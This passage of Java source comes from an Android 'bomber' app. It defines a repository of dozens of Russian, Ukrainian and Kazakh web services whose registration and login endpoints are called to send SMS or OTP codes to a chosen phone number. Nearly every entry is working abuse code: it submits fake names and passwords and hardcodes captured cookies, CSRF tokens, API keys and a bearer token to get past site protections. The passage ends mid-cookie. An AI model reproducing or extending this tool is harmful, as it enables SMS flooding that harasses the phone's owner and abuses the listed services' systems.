package com.dm.bomber.services;

import androidx.annotation.NonNull;

import com.dm.bomber.services.core.Callback;
import com.dm.bomber.services.core.FormService;
import com.dm.bomber.services.core.JsonService;
import com.dm.bomber.services.core.MultipartService;
import com.dm.bomber.services.core.ParamsService;
import com.dm.bomber.services.core.Phone;
import com.dm.bomber.services.core.Service;
import com.dm.bomber.services.core.ServicesRepository;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;

import okhttp3.Call;
import okhttp3.Headers;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class DefaultRepository implements ServicesRepository {
    @Override
    public List<Service> collect() {
        return Arrays.asList(
                new JsonService("https://www.gosuslugi.ru/auth-provider/mobile/register", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        JSONObject json = new JSONObject();

                        try {
                            json.put("instanceId", "123");
                            json.put("firstName", getRussianName());
                            json.put("lastName", getRussianName());
                            json.put("contactType", "mobile");
                            json.put("contactValue", Phone.format(phone.getPhone(), "+7(***)*******"));
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                        return json.toString();
                    }
                },

                new ParamsService("https://my.telegram.org/auth/send_password") {
                    @Override
                    public void buildParams(Phone phone) {
                        builder.addQueryParameter("phone", "+" + phone.toString());
                    }
                },

                new FormService("https://account.my.games/signup_phone_init/", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "csrftoken=B6GwyuwOSpMCrx80eXfOWAAKsqHR3qjBv7UYwkpYprKv7LOJCmfYwvwWVmIHmeRQ; _ym_uid=1681051115670765382; _ym_d=1681051115; _ym_isad=2; amc_lang=ru_RU");

                        builder
                                .add("csrfmiddlewaretoken", "B6GwyuwOSpMCrx80eXfOWAAKsqHR3qjBv7UYwkpYprKv7LOJCmfYwvwWVmIHmeRQ")
                                .add("continue", "https://account.my.games/profile/userinfo/")
                                .add("lang", "ru_RU")
                                .add("adId", "0")
                                .add("phone", phone.toString())
                                .add("password", getEmail())
                                .add("method", "phone");
                    }
                },

                new ParamsService("https://findclone.ru/register") {
                    @Override
                    public void buildParams(Phone phone) {
                        builder.addQueryParameter("phone", phone.toString());
                    }
                },

                new Service(380) {
                    @Override
                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                        JSONObject json = new JSONObject();

                        try {
                            json.put("msisdn", phone.toString());
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                        client.newCall(new Request.Builder()
                                .url("https://mnp.lifecell.ua/mnp/get-token/")
                                .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                                .build()).enqueue(new okhttp3.Callback() {
                            @Override
                            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                                callback.onFailure(call, e);
                            }

                            @Override
                            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                                try {
                                    JSONObject req = new JSONObject(Objects.requireNonNull(response.body()).string());

                                    JSONObject json = new JSONObject();
                                    json.put("contact", phone.toString());
                                    json.put("otp_type", "standart");

                                    client.newCall(new Request.Builder()
                                            .url("https://mnp.lifecell.ua/mnp/otp/send/")
                                            .header("authorization", "Token " + req.getString("token"))
                                            .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                                            .build()).enqueue(callback);

                                } catch (JSONException | NullPointerException e) {
                                    callback.onError(call, e);
                                }
                            }
                        });
                    }
                },

                new FormService("https://uss.rozetka.com.ua/session/auth/signup-phone", 380) {
                    @Override
                    public void buildBody(Phone phone) {
                        String name = getRussianName();

                        builder.add("title", name);
                        builder.add("first_name", name);
                        builder.add("last_name", getRussianName());
                        builder.add("password", getUserName() + "A123");
                        builder.add("email", getEmail());
                        builder.add("phone", phone.getPhone());
                        builder.add("request_token", "rB4eDGHMb00wHeQls7l4Ag==");

                        request.addHeader("Cookie", "ab-cart-se=new; xab_segment=123; slang=ru; uid=rB4eDGHMb00wHeQls7l4Ag==; visitor_city=1; _uss-csrf=zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5; ussat_exp=1640830991; ussat=8201437cececef15030d16966efa914d.ua-a559ca63edf16a11f148038356f6ac94.1640830991; ussrt=6527028eb43574da97a51f66ef50c5d0.ua-a559ca63edf16a11f148038356f6ac94.1643379791; ussapp=u3-u_ZIf2pBPN8Y6oGYIQZLBN4LUkQgplA_Dy2IX; uss_evoid_cascade=no");
                        request.addHeader("Csrf-Token", "zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5");
                    }
                },

                new FormService("https://happywear.ru/index.php?route=module/registerformbox/ajaxCheckEmail", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("email", getEmail());
                        builder.add("telephone", Phone.format(phone.getPhone(), "7(***)***-**-**"));
                        builder.add("password", "qVVwa6QwcaCPP2s");
                        builder.add("confirm", "qVVwa6QwcaCPP2s");
                    }
                },

                new ParamsService("https://www.sportmaster.ua/?module=users&action=SendSMSReg", 380) {
                    @Override
                    public void buildParams(Phone phone) {
                        builder.addQueryParameter("phone", phone.toString());
                    }
                },

                new FormService("https://yaro.ua/assets/components/office/action.php", 380) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("action", "authcustom/formRegister");
                        builder.add("mobilephone", phone.toString());
                        builder.add("pageId", "116");
                        builder.add("csrf", "b1618ecce3d6e49833f9d9c8c93f9c53");
                    }
                },

                new JsonService("https://api.01.hungrygator.ru/web/auth/webotp", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        JSONObject json = new JSONObject();

                        try {
                            json.put("userLogin", Phone.format(phone.getPhone(), "+7 (***) ***-**-**"));
                            json.put("fu", "bar");
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                        return json.toString();
                    }
                },

                new FormService("https://sushiicons.com.ua/kiev/index.php?route=common/cart/ajaxgetcoderegister", 380) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("firstname", getRussianName());
                        builder.add("phone", Phone.format(phone.getPhone(), "+380 (**) ***-**-**"));
                        builder.add("birthday", "2005-03-05");
                    }
                },

                new JsonService("https://e-solution.pickpoint.ru/mobileapi/17100/sendsmscode") {
                    @Override
                    public String buildJson(Phone phone) {
                        JSONObject json = new JSONObject();

                        try {
                            json.put("PhoneNumber", phone.toString());
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                        request.addHeader("User-Agent", "Application name: pickpoint_android, Android version: 29, Device model: Mi 9T Pro (raphael), App version name: 3.9.0, App version code: 69, App flavor: , Build type: release");
                        request.addHeader("Connection", "Keep-Alive");
                        request.addHeader("Accept-Encoding", "gzip");

                        return json.toString();
                    }
                },

                new JsonService("https://xn--80adjkr6adm9b.xn--p1ai/api/v5/user/start-authorization", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        JSONObject json = new JSONObject();

                        try {
                            json.put("phone", Phone.format(phone.getPhone(), "+7 *** ***-**-**"));
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                        return json.toString();
                    }
                },

                new ParamsService("https://c.ua/index.php?route=account/loginapples/sendSMS", 380) {
                    @Override
                    public void buildParams(Phone phone) {
                        builder.addQueryParameter("route", "account/loginapples/sendSMS");
                        builder.addQueryParameter("phone", "0" + phone);
                    }
                },

                new ParamsService("https://my.hmara.tv/api/sign", 380) {
                    @Override
                    public void buildParams(Phone phone) {
                        builder.addEncodedQueryParameter("contact", phone.toString());
                        builder.addEncodedQueryParameter("deviceId", "81826091-f299-4515-b70f-e82fd00fec9a");
                        builder.addEncodedQueryParameter("language", "ru");
                        builder.addEncodedQueryParameter("profileId", "1");
                        builder.addEncodedQueryParameter("deviceType", "2");
                        builder.addEncodedQueryParameter("ver", "2.2.9");

                        request.header("Cookie", "_ga=GA1.2.641734216.1650994527; _gid=GA1.2.109748838.1650994527; _gat_gtag_UA_131143143_1=1; _fbp=fb.1.1650994527815.1351289375; _hjFirstSeen=1; _hjSession_1352224=eyJpZCI6IjQ4ZWY4YmFhLTBmZDMtNGE1Yy05NGNiLWUzNzUzMjY5YWI5ZiIsImNyZWF0ZWQiOjE2NTA5OTQ1MjgzNTIsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=0; _hjSessionUser_1352224=eyJpZCI6ImQwMjA0NjA2LWNjYWUtNTBmNi1hMmNjLTU5YzdhMDQ5MTQwNyIsImNyZWF0ZWQiOjE2NTA5OTQ1Mjc4NzEsImV4aXN0aW5nIjp0cnVlfQ==; _gat=1");
                    }
                },

                new FormService("https://be.budusushi.ua/login", 380) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("LoginForm[username]", "0" + phone);
                    }
                },

                new JsonService("https://adengi.ru/rest/v1/registration/code/send") {
                    @Override
                    public String buildJson(Phone phone) {
                        JSONObject json = new JSONObject();

                        try {
                            json.put("email", getEmail());
                            json.put("firstName", getRussianName());
                            json.put("lastName", getRussianName());
                            json.put("middleName", getRussianName());
                            json.put("phone", phone.toString());
                            json.put("via", "sms");
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                        return json.toString();
                    }
                },

                new JsonService("https://sberuslugi.ru/api/v1/user/secret", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        JSONObject json = new JSONObject();

                        try {
                            json.put("phone", Phone.format(phone.getPhone(), "+7 (***) ***-**-**"));
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                        return json.toString();
                    }
                },

                new FormService("https://bandeatos.ru/?MODE=AJAX", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("sessid", "404d33f8bac1c1aa4305e6af3ebffa8b");
                        builder.add("FORM_ID", "bx_1789522556_form");
                        builder.add("PHONE_NUMBER", "+" + phone.toString());
                    }
                },

                new Service(7) {
                    @Override
                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                        client.newCall(new Request.Builder()
                                .url("https://pizzaco.ru/api/user/generate-password")
                                .header("Cookie", "upkvartal-frontend=t466jslnqhsc8ffkaqlf65bnfg; _csrf-frontend=eca7110ac5f6820f172812ae76b93ea6f91976b5374d49b3e50823904e661505a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22MqdE5DQapqSuoKww3kzp22qKVRklmP2O%22%3B%7D; _ym_uid=1656577574308706185; _ym_d=1656577574; _ym_visorc=w; _ym_isad=2; advanced-api=cm1ium0dmmq1nbveiinjdiku16; api-key=4e661934-f84e-11ec-9a5c-d00d1849d38c; app-settings=%7B%22promo_text%22%3Anull%2C%22cart_suggest_header%22%3Anull%2C%22seo_info%22%3A%7B%22title%22%3A%22%D0%93%D0%BB%D0%B0%D0%B2%D0%BD%D0%B0%D1%8F%22%2C%22description%22%3Anull%7D%2C%22auth_by_call%22%3Afalse%2C%22voice_call_auth%22%3Afalse%2C%22has_promo_advice%22%3Afalse%2C%22ask_address_on_first_enter%22%3Atrue%2C%22ask_address_on_add_to_cart%22%3Atrue%2C%22min_order_value%22%3A600%2C%22order_disable_card_for_weight%22%3Afalse%2C%22app_store_id%22%3A%22app%22%2C%22order_cart_to_courier%22%3Atrue%2C%22order_auth%22%3Afalse%2C%22takeaway_enabled%22%3Atrue%2C%22not_heat%22%3Afalse%2C%22default_persons_count%22%3A%221%22%2C%22order_to_time%22%3Afalse%2C%22show_not_call%22%3Afalse%2C%22order_show_persons%22%3Atrue%2C%22disable_order%22%3Afalse%2C%22default_phone%22%3A%22%2B7(812)220-01-02%22%2C%22auth_enabled%22%3Atrue%2C%22catalog_currency_symbol%22%3A%22%D0%A0%22%2C%22app_menu%22%3A%5B%7B%22id%22%3A10%2C%22title%22%3A%22%D0%9E%20%D0%BD%D0%B0%D1%81%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22o-nas%22%7D%7D%2C%7B%22id%22%3A11%2C%22title%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B8%20%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B0%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22dostavka-i-oplata-mobil%22%7D%7D%5D%2C%22footer_menu%22%3A%5B%7B%22id%22%3A1%2C%22title%22%3A%22%D0%9E%20%D0%BD%D0%B0%D1%81%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22o-nas%22%7D%7D%2C%7B%22id%22%3A2%2C%22title%22%3A%22%D0%9A%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D1%8B%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22kontakty%22%7D%7D%2C%7B%22id%22%3A8%2C%22title%22%3A%22%D0%90%D0%BA%D1%86%D0%B8%D0%B8%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22akcii%22%7D%7D%2C%7B%22id%22%3A9%2C%22title%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B8%20%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B0%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22dostavka-i-oplata%22%7D%7D%5D%2C%22mobile_menu%22%3A%5B%7B%22id%22%3A5%2C%22title%22%3A%22%D0%9C%D0%B5%D0%BD%D1%8E%22%7D%2C%7B%22id%22%3A3%2C%22title%22%3A%22%D0%9E%20%D0%BD%D0%B0%D1%81%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22o-nas%22%7D%7D%2C%7B%22id%22%3A4%2C%22title%22%3A%22%D0%9A%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D1%8B%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22kontakty%22%7D%7D%2C%7B%22id%22%3A6%2C%22title%22%3A%22%D0%90%D0%BA%D1%86%D0%B8%D0%B8%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22akcii%22%7D%7D%2C%7B%22id%22%3A7%2C%22title%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B8%20%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B0%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22dostavka-i-oplata%22%7D%7D%5D%2C%22header_menu%22%3A%5B%5D%2C%22combine_promo_and_bonus%22%3Afalse%2C%22order_disable_cash%22%3Afalse%2C%22loyalty_program%22%3A%7B%22enabled%22%3Afalse%7D%2C%22whatsapp%22%3Anull%2C%22tg%22%3Anull%2C%22privacy_link%22%3Anull%2C%22promo_link%22%3A%22http%3A%2F%2Fabout.mnogolososya.ru%2Freceive_advertising%22%2C%22instagram%22%3Anull%2C%22vk%22%3Anull%2C%22facebook%22%3Anull%2C%22update_privacy%22%3Afalse%2C%22main_logo%22%3A%22https%3A%2F%2Fthapl-public.storage.yandexcloud.net%2F%2Fimg%2FSiteSetting%2F7eb85221f6c97c13f93532fffc1edc42_origin_.svg%22%2C%22additional_logo%22%3Anull%2C%22header_background%22%3A%22https%3A%2F%2Fstorage.yandexcloud.net%2Fthapl-public%2F%2Fimg%2FSiteSetting%2F74dff64b5b8cff080bc39a5678b2107d_origin.png%22%2C%22order_to_time_disable_holidays%22%3Atrue%2C%22order_to_time_min_gap_days%22%3A0%2C%22order_to_time_max_gap_days%22%3A2%2C%22start_up_promos%22%3A%5B%5D%2C%22check_region%22%3Afalse%7D")
                                .header("x-thapl-apitoken", "4e661934-f84e-11ec-9a5c-d00d1849d38c")
                                .post(RequestBody.create("------WebKitFormBoundaryMQ1naEW4T6mNqlQx\n" +
                                                "Content-Disposition: form-data; name=\"phone\"\n" +
                                                "\n" +
                                                Phone.format(phone.getPhone(), "+7 *** *** ** **\n") +
                                                "------WebKitFormBoundaryMQ1naEW4T6mNqlQx--",
                                        MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryMQ1naEW4T6mNqlQx")))
                                .build()).enqueue(callback);
                    }
                },

                new Service(7) {
                    @Override
                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                        client.newCall(new Request.Builder()
                                .url("https://food-port.ru/api/user/generate-password")
                                .header("x-thapl-apitoken", "0b84683a-14b6-11ed-9881-d00d1849d38c")
                                .header("x-thapl-domain", "kronshtadt.food-port.ru")
                                .header("x-thapl-region-id", "2")
                                .post(RequestBody.create("------WebKitFormBoundaryd1lHEip8CBDSaYZd\n" +
                                        "Content-Disposition: form-data; name=\"phone\"\n" +
                                        "\n" +
                                        Phone.format(phone.getPhone(), "+7 *** *** ** **") +
                                        "\n------WebKitFormBoundaryd1lHEip8CBDSaYZd--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryd1lHEip8CBDSaYZd")))
                                .build()).enqueue(callback);
                    }
                },

                new FormService("https://dobropizza.ru/ajaxopen/userregisterdobro", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("username", Phone.format(phone.getPhone(), "+7(***) ***-**-**"));
                        builder.add("sms", "0");
                        builder.add("cis", "57");
                    }
                },

                new FormService("https://italiani.rest/local/templates/italini/PhoneAuth.php", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("phone", Phone.format(phone.getPhone(), "+7(***)***-**-**"));
                        builder.add("type", "sendauth");
                    }
                },

                new JsonService("https://api.sunlight.net/v3/customers/authorization/") {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "rr-testCookie=testvalue; rrpvid=355622261348501; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; city_auto_popup_shown=1; rcuid=6275fcd65368be000135cd22; city_id=117; city_name=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; city_full_name=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; region_id=91eae2f5-b1d7-442f-bc86-c6c11c581fad; region_name=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; region_subdomain=\"\"; ccart=off; _ga_HJNSJ6NG5J=GS1.1.1659884102.1.1.1659884103.59; _gcl_au=1.1.506379343.1659884104; session_id=6e72af95-3f3f-4b9f-a6d6-a7d278592347; _ga=GA1.2.1345812504.1659884102; _gid=GA1.2.362170990.1659884104; _gat_test=1; _gat_UA-11277336-11=1; _gat_UA-11277336-12=1; _gat_owox=1; tmr_lvid=220061aaaf4f8e8ab3c3985fb53cb3f3; tmr_lvidTS=1659884104985; tmr_reqNum=2; _tt_enable_cookie=1; _ttp=07d211e3-9558-4957-95dd-496cafdd2431; _ym_uid=1659884110990105023; _ym_d=1659884110; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; _ym_isad=2; _ym_visorc=b");

                        try {
                            return new JSONObject()
                                    .put("phone", phone.toString())
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new ParamsService("https://bankiros.ru/send-code/verify") {
                    @Override
                    public void buildParams(Phone phone) {
                        request.header("Cookie", "_csrf=8582d9183ea0f6a17304125414be4795f198a69237317e3adf77463c93c2dc42a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%220bBJbi4bJgsHJ3_s2QkIYgUF5AGdKw8H%22%3B%7D; app_history=%5B%22https%3A%2F%2Fbankiros.ru%2F%22%5D; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-08-07%2017%3A47%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fbankiros.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-08-07%2017%3A47%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fbankiros.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F103.0.5060.134%20Safari%2F537.36%20Edg%2F103.0.1264.77; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbankiros.ru%2F; city-tooltip=1; prod=5posuk9of5hcopttjj6bnfe8g2; _gcl_au=1.1.1996142512.1659883651; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; ga_session_id=4ce074bd-0b40-4664-8231-10c73438fc06; _gid=GA1.2.151715844.1659883653; _ga_5D863YT644=GS1.1.1659883653.1.0.1659883653.0; tmr_lvid=7e50cf8f2108a9fb1e34da6702768225; tmr_lvidTS=1659883653264; tmr_detect=0%7C1659883655576; _ga=GA1.2.316605841.1659883653; _ym_uid=1659883656667247307; _ym_d=1659883656; _ym_visorc=b; _ym_isad=2; tmr_reqNum=3; cookies-tooltip=223025677b0f227a6dd1c3820a99553a6d485d2246bf8dbc1879a5982ec9a863a%3A2%3A%7Bi%3A0%3Bs%3A15%3A%22cookies-tooltip%22%3Bi%3A1%3Bs%3A1%3A%221%22%3B%7D");
                        request.header("x-csrf-token", "LcaB1fFLqRU-B791Zfir3HeB2tSxeA2vSWNTxHXxy9QdpMOfkyKdd3RgzD0vy_SvRdCxnegfWOl8IhSgPobznA==");
                        request.header("x-requested-with", "XMLHttpRequest");

                        builder.addQueryParameter("action", "sendSms");
                        builder.addQueryParameter("phone", phone.toString());
                        builder.addQueryParameter("userIdentityId", "91445499");
                        builder.addQueryParameter("ga", "GA1.2.316605841.1659883653");
                    }
                },

                new JsonService("https://adengi.ru/rest/v1/registration/code/send", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "deviceUid=14b4ccbc-9f0c-460e-b756-9edcf8cd68d2; __cfruid=5e7708e2f80d72738db410be7aee4e588e853f7c-1659885549; _ga=GA1.2.348103934.1659885585; _gid=GA1.2.2043862512.1659885585; tmr_lvid=e462f5f07dce35b045f464b2f70b516e; tmr_lvidTS=1656429758785; _ym_uid=1656429759333836542; _ym_d=1659885586; _ym_visorc=b; _ym_isad=2; tmr_detect=0%7C1659885587521; supportOnlineTalkID=GwJBk17SVDMh9IVIpEnrbvZdNdxdL86o; ec_id=14b4ccbc-9f0c-460e-b756-9edcf8cd68d2; deviceUid=14b4ccbc-9f0c-460e-b756-9edcf8cd68d2; tmr_reqNum=11");
                        request.header("x-device-uid", "14b4ccbc-9f0c-460e-b756-9edcf8cd68d2");
                        request.header("x-version-fe", "1659504023660");

                        try {
                            return new JSONObject()
                                    .put("email", getEmail())
                                    .put("firstName", getRussianName())
                                    .put("lastName", getRussianName())
                                    .put("middleName", getRussianName())
                                    .put("phone", phone.toString())
                                    .put("via", "sms")
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new Service(7) {
                    @Override
                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                        client.newCall(new Request.Builder()
                                .url("https://ovenpizza.ru/wp-content/themes/twentynineteen/inc/func.php")
                                .post(RequestBody.create("------WebKitFormBoundaryZqudgny7DXMMKMxU\n" +
                                        "Content-Disposition: form-data; name=\"flag\"\n" +
                                        "\n" +
                                        "check_login\n" +
                                        "------WebKitFormBoundaryZqudgny7DXMMKMxU\n" +
                                        "Content-Disposition: form-data; name=\"tel\"\n" +
                                        "\n" +
                                        Phone.format(phone.getPhone(), "+7 *** *** **-**") +
                                        "\n------WebKitFormBoundaryZqudgny7DXMMKMxU--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryZqudgny7DXMMKMxU")))
                                .build()).enqueue(callback);
                    }
                },

                new FormService("https://chocofood.kz/gateway/user/v2/code/", 77) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("client_id", "11619734");
                        builder.add("login", phone.toString());
                    }
                },

                new JsonService("https://sso.mycar.kz/auth/login/", 77) {
                    @Override
                    public String buildJson(Phone phone) {
                        try {
                            return new JSONObject()
                                    .put("phone_number", "+" + phone.toString())
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new ParamsService("https://arbuz.kz/api/v1/user/verification/phone", 77) {
                    @Override
                    public void buildParams(Phone phone) {
                        request.header("authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI1MjZjODk1NS0wMzgzLTRiM2QtYTJjNy0wZDQ2N2NlYzVhZWQiLCJpc3MiOiJRaEZTNW5vMmJqQzQ3djVRNEU3N0FBMnh3V1BFdUJ1biIsImlhdCI6MTY1OTg5MTQ3MCwiZXhwIjo0ODEzNDkxNDcwLCJjb25zdW1lciI6eyJpZCI6ImU1YzRlYTA1LWY4ZTgtNDJiZC1iMDJhLWNmMzNlODAyZjA5NiIsIm5hbWUiOiJhcmJ1ei1rei53ZWIuZGVza3RvcCJ9LCJjaWQiOm51bGx9.ebpJLdB-FOfb1IsAVbW-dECSoKwQc5tsnhhYKZ_FeM4");

                        builder.addQueryParameter("phone", phone.toString());
                    }
                },

                new JsonService("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Accept", "application/json, text/javascript, */*; q=0.01");
                        request.header("Accept-Encoding", "gzip, deflate, br");
                        request.header("Accept-Language", "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7");
                        request.header("Connection", "keep-alive");
                        request.header("Content-Length", "24");
                        request.header("Content-Type", "application/json");
                        request.header("Cookie", "geo_site=www; geo_region_url=www; site_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; site_city_id=2; mobile=false; device=pc; _ga=GA1.2.823290515.1656377291; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-06-28%2003%3A48%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-06-28%2003%3A48%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; _ym_uid=16563772911015405951; _ym_d=1656377291; __zzat129=MDA0dBA=Fz2+aQ==; geo_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; geo_region_coords=55.755787%2C37.617634; geo_site_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; cfids129=; APPLICATION_CONTEXT_CITY=21; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F102.0.5005.115%20Safari%2F537.36%20OPR%2F88.0.4412.75; _gid=GA1.2.229297435.1657385025; _ym_isad=1; _ym_visorc=b; geo_detect_coords=55.796539%2C49.1082; geo_detect_url=kazan; 